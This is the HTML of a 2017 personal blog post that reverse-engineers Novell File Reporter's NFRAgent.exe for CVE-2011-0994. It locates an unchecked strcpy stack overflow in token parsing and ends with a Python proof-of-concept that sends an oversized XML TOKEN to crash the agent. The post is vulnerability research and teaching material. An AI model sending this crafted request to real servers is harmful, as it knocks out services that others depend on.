@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>The Vupen Entry Test (Part 1) | Charles Muiruri</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+<meta name="keywords" content="Reversing Engineering, Windows, Vulnerability research">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Vupen Entry Test (Part 1)">
+<meta property="og:url" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/index.html">
+<meta property="og:site_name" content="Charles Muiruri">
+<meta property="og:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/strings.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/token_string.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main_1.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/setup_sr.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/connection_request.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/validate_request_type.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/token.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer_1.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/crash.png">
+<meta property="og:updated_time" content="2017-12-05T10:52:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The Vupen Entry Test (Part 1)">
+<meta name="twitter:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+<meta name="twitter:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Charles Muiruri" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-99584891-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <h1 id="logo-wrap">
+                <a href="/" id="logo">
+                    Charles Muiruri
+                </a>
+            </h1>
+            
+                <h2 id="subtitle-wrap">
+                    <a href="/" id="subtitle">
+                        EXPLOIT DEVELOPMENT ||  I BREAK TO BUILD
+                    </a>
+                </h2>
+                
+        </div>
+        <div id="header-inner" class="inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <a class="main-nav-link" href="/">
+                        Home
+                    </a>
+                    
+                    <a class="main-nav-link" href="/archives">
+                        Archives
+                    </a>
+                    
+            </nav>
+            <nav id="sub-nav">
+                <a id="nav-github-link" class="nav-icon" href="https://github.com/icrackthecode"></a>
+                <a id="nav-linkedin-link" class="nav-icon" href=""></a>
+                <a id="nav-twitter-link" class="nav-icon" href="https://twitter.com/icrackthecode"></a>
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+                    
+                        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://icrackthecode.github.io"></form>
+            </div>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-The-Vupen-Entry-Test-Part-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/05/The-Vupen-Entry-Test-Part-1/" class="article-date">
+  <time datetime="2017-12-05T10:16:10.000Z" itemprop="datePublished">2017-12-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      The Vupen Entry Test (Part 1)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find some of this challanges. I eventually bumped in to an Entry test that belongs to Vupen (whose founder went ahead to launch Zerodium). This seemed really interesting. </p>
+<p>In this post we will focus on reversing, bug hunting and triggering the bug we find. Theere will be a follow up (Part 2 that focuses on the exploitation part). </p>
+<p>Let the detective work begin 🕵️ .</p>
+<a id="more"></a>
+<h3 id="The-test"><a href="#The-test" class="headerlink" title="The test"></a>The test</h3><p>The vulnerability to analyze is the following (CVE-2011-0994):</p>
+<p><a href="http://dl.packetstormsecurity.net/1104-advisories/ZDI-11-116.txt" target="_blank" rel="external">http://dl.packetstormsecurity.net/1104-advisories/ZDI-11-116.txt</a></p>
+<p>You are expected to provide a code execution exploit  with DEP bypass (if possible) to run calc.exe . The code should be developed in Python 2.x or 3.x. If you do <em>not</em> manage to exploit the flaw, please provide a python PoC which shows control of EIP.</p>
+<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><p>Well the first thing I did was look for the software of interest i.e the Novell File Reporter software, refered to as NFR as from now.<br>Well this was easily available from their site. So I grabbed the relevant version ie 1.0.1.</p>
+<p>In this case I didn’t to do any diffs so I opted to take the long way and reverse from scratch.<br>Next step is to install the Novell File Reporter software so as to get the executables,  in this case, NFRAgent.exe.</p>
+<p>Given that I have some information of the type of bug I am after, I dint have to do alot of reconnaissance so I just loaded the executable to IDA (I simply call this BAE).</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png" alt="main"></p>
+<p>Looking at the main function reversing this seems like a walk in the park ,since there IDA imports windows signatures making it easy for use (Also having reversed a couple of firmware this was fairly easy). Now the next step is finding a good attack surtface that meets our requirements. In this case, the bug is specifically a stack buffer overflow hence a good target would be some sort of input that overflows a buffer in the stack. </p>
+<p>The first step is to go through the string just to get a feel of what kind of strings are available. In this case, I am focusing more on strings that might print out or log user input.<br>to narrow down my search I am looking for any string that uses string formating. Well one might ask why strings ? Its simple if its a string I have control of it plus we have the word  <strong> <em> stack buffer</em> </strong> and from the aforementioned I am looking for anything that might allow me to overflow a  buffer on the stack. </p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/strings.png" alt="Strings"></p>
+<p>Looking  through the string we find  a string that looks interesting .</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/token_string.png" alt="Token String"></p>
+<p>The above string seems to take a token and use it or print it .Well at this point its not clear how the string is use but surely looks intersting. To have a deeper understanding it would be wise at this point to figure out how a token is created.</p>
+<h3 id="Understanding-NFRAgent-exe"><a href="#Understanding-NFRAgent-exe" class="headerlink" title="Understanding NFRAgent.exe"></a>Understanding NFRAgent.exe</h3><p>Looking the main funtion the program begins by creating a new operator if creation was succesful it passes the a value to a functiion which I have named setup_sr_engine.</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/main_1.png" alt="main"></p>
+<p>Looking carefully, at setup_sr_engine we can see that it sets a new ServerNetworkInterface whose 6th argument is a  pointer to a function which we have named connection request.</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/setup_sr.png" alt="Ssetup_sr_engine"></p>
+<p>Now let  dive deeper into connection_request</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/connection_request.png" alt="Connection request"></p>
+<p>Looking at the above it is evident that this functions identifies the connection requestion based on a key provided as part of the connection request eg FSFUI. In this case we will focus on handle_FSFUI_request .</p>
+<p>This function handles a FSFUI request  which later tries to validate the specific request type</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png" alt="handle_FSFUI_request"></p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/validate_request_type.png" alt="validate_request_type"></p>
+<p>Nice 😀 now we can see the call to parse_token (which we have named so after reversing) and it takes the value of the node <strong> <em> TOKEN </em> </strong>.</p>
+<h3 id="Understanding-token-parsing"><a href="#Understanding-token-parsing" class="headerlink" title="Understanding token parsing"></a>Understanding token parsing</h3><p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/token.png" alt="Token"></p>
+<p>A closer look at token operations</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer.png" alt="token operation"></p>
+<p><strong> strcpy(_token_dest, _token); </strong><br>At this point we see that there is no check for _token_dest so the  current goal is to find the size of the buffer (_token_dest)  as it makes a good candidate for a stack buffer overflow.</p>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer_1.png" alt="Token data"></p>
+<p>Looking carefully at <strong> char *token_data; // [esp+4h] [ebp-98h]</strong> its evident that the size of buffer is 98h which translates <strong>char token_data[150]</strong>;</p>
+<p>looking carefully at<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">token_len = 2 * xercesc_2_7::XMLString::stringLen(token) + 2;</div><div class="line">_token = (char *)malloc(token_len</div></pre></td></tr></table></figure></p>
+<p>we can see size of _token is calculated by getting the length of the string passed in <strong>Token</strong> then plus 2 which  means to overflow the buffer we need  to have <strong>lenghtof(token_data)&lt; lengthof(token_passed)</strong> which translates to </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lengthof(token_passed ) &gt; [(150 (size of token data) / 2 ) - 2]</div><div class="line">this translates to</div><div class="line">lengthof(token_passed ) &gt; 73 bytes</div></pre></td></tr></table></figure>
+<h3 id="Gathering-the-facts"><a href="#Gathering-the-facts" class="headerlink" title="Gathering the facts"></a>Gathering the facts</h3><ol>
+<li>We have control over the value of token as we can send it when making a request</li>
+<li>We can send this string request remotely through port 80 for http and 3037 for https</li>
+</ol>
+<p>Looking at the above facts we are right to say we have a bug.</p>
+<h4 id="WOOOOT-🎉🎉🎉🎉-We-have-a-bug"><a href="#WOOOOT-🎉🎉🎉🎉-We-have-a-bug" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We have a bug."></a>WOOOOT !!! 🎉🎉🎉🎉  We have a bug.</h4><h3 id="Triggering-the-bug"><a href="#Triggering-the-bug" class="headerlink" title="Triggering the bug"></a>Triggering the bug</h3><p>Well the best langugae  for such would be python given that its remote attack.</p>
+<p>In this case,  the request of interest in this case would all the key that we called along the request .<br>As a result the request will look like this<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;OUR TOKEN VALUE&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT</div></pre></td></tr></table></figure></p>
+<p>Given that its an xml request we will send in that form </p>
+<h4 id="The-trigger-code"><a href="#The-trigger-code" class="headerlink" title="The trigger code"></a>The trigger code</h4> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">import httplib, md5, sys,struct</div><div class="line"></div><div class="line">def message_MD5(arg):</div><div class="line">    v = <span class="string">"SRS"</span> + arg + <span class="string">"SERVER"</span></div><div class="line">    m = md5.new(v)</div><div class="line">    <span class="built_in">return</span> m.hexdigest()</div><div class="line"></div><div class="line">try:</div><div class="line">	conn = httplib.HTTPConnection(<span class="string">"192.168.0.12:80"</span>)</div><div class="line">	headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"text/xml"</span>&#125;</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line">	junk = <span class="string">'A'</span> * 100</div><div class="line"></div><div class="line"></div><div class="line">	body = <span class="string">"&lt;ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;"</span>+junk+<span class="string">"&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT&gt;"</span></div><div class="line"></div><div class="line">	body =  message_MD5(body).upper() + body</div><div class="line">	conn.request(<span class="string">"POST"</span>, <span class="string">"/"</span>,body, headers)</div><div class="line">	response = conn.getresponse()</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[+] Connected successfuly"</span>)</div><div class="line">	<span class="built_in">print</span> response.status, response.reason</div><div class="line"> </div><div class="line">except Exception as e:</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[-] Connection failed with error %s"</span>,e)</div><div class="line">finally:</div><div class="line">	conn.close()</div></pre></td></tr></table></figure>
+<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/crash.png" alt="Crash"></p>
+<h4 id="WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪"><a href="#WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 ."></a>WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 .</h4><p>Part 2 will cover DEP bypass, SEH bypass and controlling the EIP stay tunned 😀 .</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/" data-id="cjatibyg50003o22y55spszfe" class="article-share-link">Share</a>
+      
+        <a href="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reversing-Engineering-Windows-Vulnerability-research/">Reversing Engineering, Windows, Vulnerability research</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/10/04/Android-Hooking/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Android Hooking</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/OS-X-iOS/">OS X/iOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reversing-Engineering-Windows-Vulnerability-research/">Reversing Engineering, Windows, Vulnerability research</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/OS-X-iOS/" style="font-size: 10px;">OS X/iOS</a> <a href="/tags/Reversing-Engineering-Windows-Vulnerability-research/" style="font-size: 10px;">Reversing Engineering, Windows, Vulnerability research</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/12/05/The-Vupen-Entry-Test-Part-1/">The Vupen Entry Test (Part 1)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/10/04/Android-Hooking/">Android Hooking</a>
+          </li>
+        
+          <li>
+            <a href="/2017/05/17/SIOCSIFORDER-count-out-of-bounds/">SIOCSIFORDER count memory corruption bug</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Charles Muiruri<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'icrackthecode';
+  
+  var disqus_url = 'http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
